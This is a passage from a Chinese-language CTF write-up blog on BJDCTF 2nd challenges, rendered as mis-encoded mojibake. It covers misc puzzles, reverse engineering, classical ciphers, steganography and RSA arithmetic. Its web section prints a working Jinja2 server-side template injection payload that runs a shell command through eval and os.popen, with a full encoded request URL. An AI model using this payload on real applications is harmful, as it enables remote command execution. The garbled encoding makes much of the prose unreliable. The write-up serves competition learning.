å‡ç­‰ç­‰æ“ä½œï¼Œæ²¡æœ‰æ”¶è·ã€‚ å†çœ‹ hex æ•°æ®ï¼Œè¿™ä¸€å †è¿˜æ˜¯æ„Ÿè§‰åƒäºŒç»´ç ï¼Œè¿™ä¹ˆè§„åˆ™çš„0å’Œ1ã€‚ æœ€åï¼Œåœ¨æˆ‘å‡†å¤‡å…³æ‰ 010editor çš„æ—¶å€™ï¼Œä¼¸äº†ä¸ªæ‡’è…°ï¼Œä»è¿œå¤„çœ‹ï¼Œå•Šï¼ è¿™ä¹Ÿå¤ªæœ‰è„‘æ´äº†å§ï¼ï¼ˆè‡ªè¡Œè„‘è¡¥å°†FFæˆ–Ã¿Ã¿çœ‹æˆæ˜¯å®çº¿å°±è¡Œï¼‰ äºæ˜¯å¾—åˆ°flagã€‚ BJD{572154976} ï¼ˆè¿™å¥½åƒæ˜¯ imagin å¸ˆå‚…çš„QQå·å”‰ Imagin - å¼€åœºæ›²ä¹‹å‰å°±çœ‹è¿‡è¿™ä¸ª mikutapï¼Œå‰å‡ å¤©æ™šä¸Šè¿˜æœ‰ä¸ªå­¦å¼Ÿ at æˆ‘æ¥ä¸€èµ·ç©ï¼ˆæ¢ç©¶ï¼‰çš„â€¦â€¦ å°±æ˜¯è¿™ä¸ªâ†’http://taqini.space/mikutap/ ï¼Œå¤šæœ‰æ„æ€å‘¢ã€‚ ä»–è¿™ä¸ªæ¯ä¸€ä¸ªæŒ‰é”®å¯¹åº”ç€ä¸€ä¸ªéŸ³è°ƒå’Œä¸€ä¸ªåŠ¨ç”»ï¼Œç†è®ºä¸Šå¯ä»¥é€†å‘å›å»å¾—åˆ° flagã€‚ æ‹–è¿› PR äº†åå¤å¬äº†å¥½å¤šéï¼Œç¡®å®šäº†å‡ ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªå­—ç¬¦åº”è¯¥æ˜¯Mâ€¦â€¦ åŸæ¥æ˜¯æ ¹æ®éŸ³è°ƒå’ŒåŠ¨ç”»æ¥åˆ¤æ–­çš„ï¼Œæ¢äº†ä¸€ä¸ªæµè§ˆå™¨ï¼Œå‘ç°åŠ¨ç”»ä¸ä¸€æ ·äº†ï¼Œè‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œä¸ç©äº†æƒ¹ã€‚ æ€è·¯æ„Ÿè§‰å¯ä»¥å…ˆå½•ä¸€æ®µ BGMï¼Œåšä¸€ä¸ª sub æŠŠè§†é¢‘ä¸­çš„ BGM å»é™¤ã€‚è€Œåç»™æ¯ä¸€ä¸ªæŒ‰é”®å½•ä¸€ä¸ªï¼Œç¡®å®šæ˜ å°„å…³ç³»ï¼Œç†è®ºä¸Šå°±èƒ½å”¯ä¸€å¯¹åº”ä¸ŠåŸå§‹æŒ‰é”®ã€‚ ï¼ˆæ„Ÿè§‰ç›´æ¥å¬å‡ºæ¥çš„çœŸå¼ºï¼Œæ€•ä¸æ˜¯éŸ³æ¸¸å¤§ä½¬ï¼Ÿ TARGZ-y1ngè¿™é“é¢˜ä¹‹å‰ä¸€ç›´æ²¡è§£å‡ºæ¥ï¼Œæœ€åæ”¾äº† hint è¯´è§£å‹å¯†ç æ˜¯æ–‡ä»¶åã€‚ äºæ˜¯æ‰‹åŠ¨è§£å‹äº†å‡ ä¸ªâ€¦â€¦æ¯ä¸ªéƒ½æ˜¯ä¸Šä¸€ä¸ªçš„å¯†ç ã€‚ å‘ç°è¿™æ ·ä¼°è®¡å¥½ä¹…éƒ½è§£ä¸å®Œï¼Œäºæ˜¯å†™ jio æœ¬ï¼ æœäº†ä¸€ä¸‹å‹ç¼©åŒ…è§£å‹çš„ APIï¼Œæ”¹äº†ä¸€ä¸‹åˆ«äººçš„ä»£ç ï¼Œå†™äº†ä¸ªå¾ªç¯ã€‚ è€ƒè™‘åˆ°æœ€åçš„ flag å¥—å¨ƒå¾ˆå¤šä¸æ–¹ä¾¿æ‰“å¼€ï¼Œäºæ˜¯å°±ç»Ÿä¸€è§£å‹åˆ°ä¸€ä¸ªç›¸åŒçš„ç›®å½•ä¸‹å¥½äº†ã€‚ import sys import os import zipfile def unzip_single(src_file, dest_dir, password): ''' è§£å‹å•ä¸ªæ–‡ä»¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹ã€‚ ''' if password: password = password.encode() zf = zipfile.ZipFile(src_file) try: zf.extractall(path=dest_dir, pwd=password) except RuntimeError as e: print(e) zf.close() if __name__ == '__main__': source_dir = r'./hW1ES89jF' dest_dir = r'./hW1ES89jF' password = 'OKMIlLVft' i = 1 while True: entry_dir = dest_dir + '/' + password + '.tar.gz' print(i, password) dest_dir = source_dir + '/' + password unzip_single(entry_dir, dest_dir, password) entry = list(os.scandir(dest_dir))[0] if entry.is_file() and os.path.splitext(entry.name)[1] == '.gz': password = os.path.splitext(entry.name)[0][:-4] else: print('error!') print(entry) i += 1 è·‘äº†ä¸€ä¸‹å‘ç°æœ€ååœ¨8L0WifU3Gè¿™ä¸ªç›®å½•ä¸‹ï¼Œå¥—å¨ƒäº† 299 è¿˜æ˜¯ 300ä¸ªå‹ç¼©åŒ…â€¦â€¦ æ‰“å¼€å¾—åˆ° flagï¼š BJD{wow_you_can_rea11y_dance} å°å§å§-y1ngè¿™é¢˜çœ‹äº†å¥½ä¹…éƒ½æ²¡åšå‡ºæ¥â€¦â€¦çŸ¥é“å›¾ç‰‡ä¸Šæœ‰æ˜æ˜¾çš„é”™ä½ï¼Œ010editor çš„è„šæœ¬è·‘ä¸ä¸‹å»ã€‚è‚¯å®šæ˜¯æ’å…¥äº†ä¸œè¥¿ã€‚ ç”¨äº† strings æ‰¾ï¼Œç„¶è€Œå¤ªæ‡’æ²¡å¼€ Ubuntuï¼Œæ²¡ç”¨ä¸Š grepï¼Œäºæ˜¯å‡ºäº†ä¸€å †å­—ç¬¦ä¸²æ²¡å‘ç° BJDâ€¦â€¦ æ€ªæˆ‘æ‡’äº†ï¼ˆè¿ PentestBox éƒ½æ‡’å¾—å¼€ï¼ŒCtrl + F éƒ½æ‡’å¾—ç”¨ BJD{haokanma_xjj} ReverseguessgameçŒœå¤§å°çš„æ¸¸æˆå”‰ã€‚ç©ä¸ªæ¯›çº¿ï¼Œæ²¡æœ‰flagï¼ ä¸¢ IDA é‡Œï¼Œçœ‹å­—ç¬¦ä¸²å°±å¾—åˆ° flagã€‚ BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA} æœç„¶æ˜¯ä¸ªéšæœºæ•°é€—ä½ ç©å‘¢ã€‚ 8086 çœ‹äºšå­åªæ˜¯æŠŠæ•°æ®ç§»åˆ° DS é‡Œï¼Œç„¶åå°±æ­»å¾ªç¯äº†ã€‚ ä¹‹å‰å­¦çš„å¾®æœºåŸç† æ±‡ç¼–å¿˜å¾—å·®ä¸å¤šäº†â€¦â€¦ï¼ˆæƒ³èµ·æ¥è¿™å­¦æœŸ DSP åé¢ç¼–ç¨‹è¿˜è¦ç”¨åˆ° emmm åœ¨ seg dseg é‡Œæœ‰è¿™ä¸€å¨ ]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b; æƒ³äº†åŠå¤©ä¸çŸ¥é“æ˜¯ä»€ä¹ˆã€‚ã€‚base91 è§£ç ä¸è¡Œã€‚ éš¾é“æ˜¯å¤§å°ç«¯é—®é¢˜ï¼Ÿ ä¸æ˜¯ã€‚ åé¢æ‰“å¼€äº†ASCIIè¡¨ï¼Œæ—¢ç„¶ flag æ ¼å¼æ˜¯ BJD{.+}ï¼Œå‰å››ä½è‚¯å®šå¯¹åº”ç€BJD{ã€‚è¿™é‡Œå¯¹åº”ç€åˆ—å‡ºæ¥ã€‚ Bin ï¼ˆäºŒè¿›åˆ¶ï¼‰ Oct ï¼ˆå…«è¿›åˆ¶ï¼‰ Dec ï¼ˆåè¿›åˆ¶ï¼‰ Hex ï¼ˆåå…­è¿›åˆ¶ï¼‰ ç¼©å†™/å­—ç¬¦ 0111 1101 0175 125 0x7D } 0100 0010 0102 66 0x42 B 0101 0101 0125 85 0x55 U 0100 1010 0112 74 0x4A J 0110 0100 0144 100 0x64 d 0111 1011 0173 123 0x7B { çªç„¶å°±å‘ç°äº†è§„å¾‹ï¼ äºŒè¿›åˆ¶åå››ä½æ˜æ˜¾æ˜¯å–äº†åï¼Œå‰å››ä½ä¸­çš„æœ€ä½ä½ä¹Ÿå–äº†ä¸ªåã€‚ pyä¸€ä¸‹ï¼Œå†™äº†ä¸ªjioæœ¬ã€‚ # -*- coding:utf-8 -*- s = ']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;' output = '' for i in s: temp = (ord(i) ^ 0x0f) temp = chr(temp ^ 0x10) # æˆ–è€…ç›´æ¥ ^ 0x1f print(temp) output += temp print(output) # BJD{jack_de_hu1b1an_xuede_henHa0}$ äºæ˜¯å¾—åˆ° flag äº†ï¼ BJD{jack_de_hu1b1an_xuede_henHa0} å˜¤ è¦å¥½å¥½å­¦æ±‡ç¼–å‘¢ï¼ˆ çœ‹äº† WP å‘ç°åŸæ¥æ˜¯è§£å¯†çš„ä»£ç è¢« IDA å½“æˆæ˜¯æ•°æ®äº†ï¼ˆå°±æ˜¯assume ss:dseg, ds:nothing ä¸Šé¢çš„é‚£ä¸€éƒ¨åˆ†ï¼‰ã€‚ å¥‡æ€ªäº†æˆ‘æ‹¿ emu8086 æ¨¡æ‹Ÿå™¨ä¹Ÿæ²¡çœ‹åˆ°è¿™ä¸€æ®µï¼Œè¿˜è·‘æ­»å¾ªç¯äº†ã€‚å™¢ï¼Œæœ¬æ¥å°±æ²¡è·‘åˆ°è§£å¯†é‚£éƒ¨åˆ†ä»£ç ï¼ å·ä¸€ä¸‹å‡ºé¢˜å¸ˆå‚…çš„æºä»£ç ï¼Œæ¥è‡ªè¿™é‡Œã€‚ DATAS SEGMENT str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H DB 77H,7aH,71H,57H,7eH,2fH,62H,59 DATAS ENDS STACKS SEGMENT STACKS ENDS CODES SEGMENT ASSUME CS:CODES,DS:DATAS,SS:STACKS loc: jmp loc mov CX,34 lea BX,str1 lop: mov DI,CX dec DI xor BYTE PTR [BX][DI],31 loop lop lea DX,str1 mov AH,09H int 21H ret START: MOV AX,DATAS MOV DS,AX call loc MOV AH,4CH INT 21H CODES ENDS END START è§£å¯†çš„éƒ¨åˆ†åœ¨lopé‡Œï¼Œæœç„¶æ˜¯å’Œ 31ï¼ˆ0x1Fï¼‰åš xorã€‚ Cryptoç­¾åˆ°-y1ngQkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ== base64 å°±è¡Œäº†ã€‚ BJD{W3lc0me_T0_BJDCTF} ç‡•è¨€ç‡•è¯­-y1ng79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 hex to ASCIIï¼š yanzi ZJQ{xilzv_iqssuhoc_suzjg} è¿™ä¸ªè¯•äº†å„ç§å¯†ç ï¼ŒçœŸæ²¡æƒ³åˆ°æ˜¯ vigenere å¯†ç ï¼Œè¿˜åœ¨æƒ³ yanzi æ˜¯å¹²å•¥ç”¨çš„â€¦â€¦ ï¼ˆä¸‹æ¬¡å…ˆè€ƒè™‘å¸¦æœ‰å¯†é’¥çš„ BJD{yanzi_jiushige_shabi} https://www.qqxiuzi.cn/bianma/weijiniyamima.php Y1nglish-y1ngNkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw. Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd. MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw} æ•´äº†åŠå¤©ä¸çŸ¥é“å’‹åŠï¼Œæœ€åæƒ³èµ·æ¥è¿˜æœ‰ä¸ªè¯é¢‘å¤§æ³•ï¼ æœäº†ä¸€ä¸‹ï¼Œè¿™ä¸ªç½‘ç«™ å¯ä»¥åˆ†æè¯é¢‘ã€‚ å¾ˆæ˜æ˜¾MIHå¯¹åº”ç€BJDã€‚ä¸‹é¢æœ€åƒçš„å°±æ˜¯è¿™ä¸ªäº†ã€‚ Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy} ç„¶è€Œäº¤ä¸Šå»ä¸å¯¹ã€‚ã€‚ çœ‹äº† hint è¯´ æ”¹æˆCr4zyæ˜¯é”™è¯¯çš„ çªç„¶æƒ³åˆ°æ˜¯crackï¼äºæ˜¯å¾—åˆ° flagã€‚ï¼ˆçœŸå°± quipquip è¿™ä¸ªç½‘ç«™å•Š BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck} cat_flagè¿™æ˜¯ä¸€å¼ æœ‰ç€ä¸€å †å–µå–µçš„ gifã€‚ 8*10ï¼Œæƒ³åˆ°æ˜¯8ä½çš„ ASCIIï¼Œ10ä¸ªå­—ç¬¦ã€‚ 01000010 æœç„¶æ˜¯ B 01111011 æœç„¶æ˜¯ {ï¼Œä¹‹åæ˜¯ 01001101 00100001 01100001 00110000 01111110 01111101 äºæ˜¯å¾—åˆ°flagï¼šBJD{M!a0~} çœŸçš„æ˜¯å–µå–µå‘€ï¼ çµèƒ½ç²¾é€š-y1ng èº«ç»ç™¾æˆ˜çš„Y1ngå·²ç»è¾¾åˆ°å´‡é«˜çš„æ­¦æœ¯å¢ƒç•Œï¼Œä»¥è‡ªå¾‹å…‹å·±æ¥å–ä»£ç‹‚çƒ­è€…çš„æˆ˜æ–—ç‹‚æ€’ä¸ä¼ ç»Ÿçš„æˆ˜æ–—å½¢å¼ã€‚Y1ngæ‰€å—çš„è®­ç»ƒä¹Ÿè¿›ä¸€æ­¥å°†ä»–ä»¬çš„çµèƒ½å¼ºåŒ–åˆ°è¶³ä»¥ç“¦è§£å‘¨é­çš„ç‰©è´¨ä¸–ç•Œã€‚å€Ÿç”±é›†ä¸­è¿™è‚¡åŠ›é‡ï¼ŒY1ngèƒ½é‡Šæ”¾çµèƒ½èƒ½é‡é£æš´æ¥æ‘§æ¯æ•Œäººçš„å¿ƒæ™ºã€è‚‰ä½“ä¸å™¨æ¢°ã€‚ ä¹‹å‰åªçŸ¥é“çŒªåœˆå¯†ç ï¼Œæ‰¾äº†åŠå¤©æ‰å‘ç°äº†è¿™ä¸ªç¼–ç ã€‚ åœ£å ‚æ­¦å£«å¯†ç  (Templar Cipher) æ˜¯å…±æµä¼šçš„â€œçŒªåœˆå¯†ç â€çš„ä¸€ä¸ªå˜ç§ï¼Œä¸€ç›´è¢«å…±æµä¼šåœ£æ®¿éª‘å£«ç”¨ã€‚ å¾—åˆ° IMKNIGHTSTEMPLAR æœ€ç»ˆ flag ä¸º flag{IMKNIGHTSTEMPLAR}ã€‚ è€æ–‡ç›²äº†ç½¼é›§ç· çœ”æ“´çæ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µçœ”é¹é° è¿™é¢˜è¿˜ä»¥ä¸ºæ˜¯ä½›æ›°ï¼Œç»“æœå‘ç°ä¸æ˜¯â€¦â€¦ çœ‹åˆ°åˆ«äººæç¤ºå‘ç°çœŸçš„è ¢ï¼Œä¸‹æ¬¡å…ˆæ‹¿å»ç»™ç¿»è¯‘è¯»ä¸€éå°±çŸ¥é“ flag äº†ã€‚ å•Šä¸å¯¹- - flag æ˜¯ BJD{æ·›åŒ¶è¥«é»¼ç€¬é¶è»„é¶›é©•é³“å“µ}ã€‚ åœ£ç«æ˜­æ˜­-y1ngè¿™ä¸ªæ˜¯ä½›æ›°äº†ï¼Œä¸è¿‡æ˜¯æ–°ä½›æ›°ã€‚ æ–°ä½›æ›°ï¼šè«¸å£½éš¸åƒ§å£½é™å½å£½è«¸å£½é™€å£½æ‘©éš¸åƒ§ç¼½è–©é¡˜å¿ƒå£½å’¤å£½å›‰å¯‚å£½é—è«¸å£½å“†å£½æ…§å£½èå£½è‰²å½æ„å£½æ‰€å£½èœœå¦‚ æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°è§£å¯†ç½‘ç«™ã€‚ã€‚æ¥ï¼Œæ”¶è—å¤¹è¯·ã€‚ æ–°ä½›æ›°ï¼šhttp://hi.pcmoe.net/buddha.html ä½›æ›°ï¼ˆä¸ä½›è®ºç¦…ï¼‰ï¼šhttp://keyfc.net/bbs/tools/tudoucode.aspx å¾—åˆ° gemlovecom å¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é çŒœ å› ä¸ºå‡ºé¢˜äººå¤±è¯¯æé”™äº†ï¼Œè§£å‡ºæ¥çš„keyå»æ‰å3ä½çš„com å»æ‰comå¥—ä¸Š BJD äº¤ä¸Šå»å‘ç°ä¸æ˜¯ã€‚ æƒ³åˆ°å¯èƒ½è¿™è¿˜æ˜¯ä¸ª key/å¯†é’¥ã€‚è¯•äº† F5 å‘ç°ä¸æ˜¯ã€‚ åæ¥çœ‹åˆ«äººçš„ WP æ‰çŸ¥é“æ˜¯ outguess å›¾åƒéšå†™ã€‚ï¼ˆå›å»è¡¥ä¸€è¡¥ æ¥äº†æ¥äº†ã€‚ GitHub ä»“åº“ï¼šhttps://github.com/crorvick/outguess OutGuess is a universal steganographic tool that allows the insertionof hidden information into the redundant bits of data sources. Thenature of the data source is irrelevant to the core of OutGuess. Theprogram relies on data specific handlers that will extract redundantbits and write them back after modification. In this version the PNMand JPEG image formats are supported. In the next paragraphs, imageswill be used as concrete example of data objects, though OutGuess canuse any kind of data, as long as a handler is provided. git clone https://github.com/crorvick/outguess.git cd outguess ./configure &amp;&amp; make &amp;&amp; make install ï¼ˆå¯èƒ½éœ€è¦ sudo å¸¸ç”¨çš„æŒ‡ä»¤å°±åŠ å¯†å’Œè§£å¯†äº†ã€‚ outguess -k \"my secret key\" -d hidden.txt demo.jpg out.jpg # åŠ å¯† outguess -k \"my secret key\" -r out.jpg hidden.txt # è§£å¯† outguess -k \"gemlove\" -r sheng_huo_zhao_zhao.jpg hidden.txt å¾—åˆ° flagï¼š BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy} rsa0å™«ï¼Ÿï¼Ÿï¼Ÿå•¥æ—¶å€™å‡ºçš„ RSAï¼Ÿæ²¡å‘ç°â€¦â€¦ æ¥è¡¥ä¸€ä¸‹å§ã€‚nc è¿ä¸Šï¼Œæ€§æ„Ÿxxåœ¨çº¿å‘é¢˜ã€‚ï¼ˆé¢˜ç›®æ¯ä¸ªç¯å¢ƒå¥½åƒä¸åŒï¼‰ e=8490247 p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728 p-q=306146015710299885882907488963590997669550770952584505436005104300551321544811637977008351542375001985864015345039058904779091905194377534370393296886314 c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888 flag=?????? åˆ†åˆ«æ±‚å¾— p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021 q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707 N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847 d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743 è€Œååˆ©ç”¨ m = pow(c, d, p*q) æ±‚å¾— m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018 è½¬ Hex å†è½¬ ASCIIï¼Œå¾—åˆ° flag flag{656092c1-50bb-459c-89ec-4cabc69b4f3e} ä¹Ÿå¯ä»¥ç”¨ long_to_bytesï¼ˆéœ€è¦å®‰è£…å¯†ç åº“ pip install pycryptodomeï¼‰ from Crypto.Util import number print(number.long_to_bytes(m)) æƒ³èµ·æ¥ä¹‹å‰è¯´è¦è£… GitHub ä¸Šé‚£ä¸ª python çš„ CTF-RSA-tool è¿˜æ²¡è£…â€¦â€¦ rsa1nc è¿ä¸Šï¼Œå¾—åˆ°é¢˜ç›®ã€‚ e=12907381 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802 p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552 c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157 flag=?????? å†æ¥ä¸€æ¬¡ e=10288339 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802 p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552 c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550 flag=?????? p å’Œ q ä¸å˜ï¼Œåˆ™ $$n = p*q = \\frac{p^2 + q^2 - (p-q)^2}{2}$$ ä¸å˜ï¼Œè€ƒè™‘æ˜¯å…±æ¨¡æ”»å‡»ï¼Œåé¢æ¥å¡«å‘ã€‚ï¼ˆç­‰æˆ‘è£…ä¸Š RSA tools Webè¿™æ¬¡æ²¡æ€ä¹ˆçœ‹ Web é¢˜â€¦â€¦ï¼ˆï¼ˆ fake googleçœ‹åˆ°è¿”å›çš„é¡µé¢ä¸Šæœ‰ä¸ªæ³¨é‡Š &lt;!--ssssssti &amp; a little trick --&gt; è¯•äº†ä¸€ä¸‹{{1-1}}å¯ä»¥å¾—åˆ° 0ï¼Œäºæ˜¯å°±æ˜¯ SSTI äº†ã€‚å¥½åƒéƒ½ä¸éœ€è¦ç»•è¿‡ã€‚ payloadï¼š {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"cd /;cat flag\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%} flag{8c252513-5c42-47fd-95b5-4d13a986e6d0} ï¼ˆè²Œä¼¼æ˜¯åŠ¨æ€ flag elementmasterâ€‹ æ‰‹ç»˜çš„å”‰ï¼ˆé‡ç‚¹ä¸å¯¹ è¿™é‡Œçš„idè½¬ ASCII å¾—åˆ° Po.phpã€‚ è®¿é—®å‘ç°å†…å®¹æ˜¯ä¸€ä¸ª .ï¼Œæ‡µäº†ã€‚ ç»™äº† hint è¯´mendeleev=é—¨æ·åˆ—å¤«ï¼Œè¿˜æœ‰ from requests import * ã€‚ æœ€åæ”¾äº†å…ƒç´ å‘¨æœŸè¡¨â€¦â€¦è¿™è„‘æ´çœŸæ²¡æƒ³åˆ°ã€‚ã€‚ å°±æ˜¯ç”¨å…ƒç´ å‘¨æœŸè¡¨çš„å…ƒç´ å»è·‘xx.phpå•¦ã€‚ï¼ˆéš¾æ€ªæ‰«æå™¨æ²¡ç”¨ æ”¶ä¸ªå°¾æ„Ÿè§‰è¿™æ¬¡ Crypto å’Œ Misc é¢˜ç›®æœ¬æ¥å°±ä¸æ€ä¹ˆéš¾ï¼Œç„¶è€Œåšèµ·æ¥æ„Ÿè§‰æ¯”è¾ƒä½›ç³»ï¼Œç›´æ¥ç›²ç›®ä¸Šæ‰‹ï¼Œæ€è·¯ä¸å¤§å¯¹ï¼Œè¿˜æ‡’ã€‚ æœ‰æŒºå¤šå¥—è·¯æ²¡æ¥è§¦è¿‡çš„ï¼Œè„‘æ´è¿˜è¦å¤§ä¸€ç‚¹å‘¢ï¼Œåé¢æœ‰ç©ºå†ç†ä¸€ä¸‹åšé¢˜çš„æ€è·¯å§ã€‚ å™¢ï¼Œå®˜æ–¹ WP ä¹Ÿå‡ºæ¥äº†ï¼Œæˆ³è¿™é‡Œå§ã€‚ å˜¤ï¼Œè¿˜æœ‰ä¸€å †ä½œä¸šæ²¡è¡¥ã€‚ æºœäº†æºœäº†ã€‚","path":"2020/03/23/CTF_BJDCTF2nd/"},{"title":"CTF | XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› WriteUp","text":"å‰è¨€ä¸Šä¸Šå‘¨çœ‹åˆ°äº†è¿™ä¸ª XCTF çš„é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›ï¼Œè§‰å¾—æœ‰ç‚¹æ„æ€å¯ä»¥ç©ä¸€ä¸‹ã€‚ äºæ˜¯ä¸Šå‘¨æœ«å°±æ°´äº†ä¸€ä¸‹ï¼Œç„¶è€Œå•¥ä¹Ÿä¸ä¼šèœåˆ°çˆ†ç‚¸ï¼Œéƒ½æ²¡å‡ é“é¢˜ä¼šåšâ€¦â€¦ï¼ˆåé¢è¿˜è¡¥ä½œä¸šçæŠ˜è…¾å»äº† æœ€è¿‘çœ‹äº†çœ‹å¤§ä½¬ä»¬çš„ WPï¼Œä¼°è®¡åœ¨ä»–ä»¬çœ¼é‡Œéƒ½æ˜¯ç­¾åˆ°é¢˜å§ï¼Œå•¥ä¹Ÿä¸è¯´ç›´æ¥ä¸¢ä¸€ä¸ª payload æå®šèµ°äººï¼ˆawslã€‚ ä¸è¿‡è¿˜æ˜¯æœ‰ç‚¹æ„Ÿå—æˆ–è€…å…¶ä»–æ–¹é¢çš„æ”¶è·ä¹‹ç±»çš„ï¼Œé¡ºä¾¿æ¥å­¦ç‚¹ä¸œè¥¿ï¼Œéšä¾¿å†™ä¸€ç‚¹å§ã€‚ å®˜æ–¹ WPï¼š ç‚¹è¿™é‡Œä¸‹è½½ ï¼ˆç‰ˆæƒå½’å®˜æ–¹æ‰€æœ‰ï¼‰ å¥½åƒå¥½å¤šç¯å¢ƒéƒ½å…³äº†ã€‚ ï¼ˆè¯è¯´è¿™ç¯‡æ–‡ç« ä¸¢ draft é‡Œå¥½ä¹…äº†å”‰ï¼Œå†ä¸å‘å°±è¦é•¿è‰äº†ã€‚ MISC2019-nCoVçœŸÂ·ç­¾åˆ° flag{shijiejiayou} æ­¦æ±‰åŠ æ²¹ï¼ä¸­å›½åŠ æ²¹ï¼ä¸–ç•ŒåŠ æ²¹ï¼ ç®€å•MISCå‹ç¼©åŒ…é‡Œæœ‰ä¸€ä¸ªflag.zipï¼ˆåŠ å¯†ï¼‰ å’Œä¸€ä¸ªphoto.jpgï¼ˆæ‰“ä¸å¼€ï¼‰ã€‚ photo.jpg 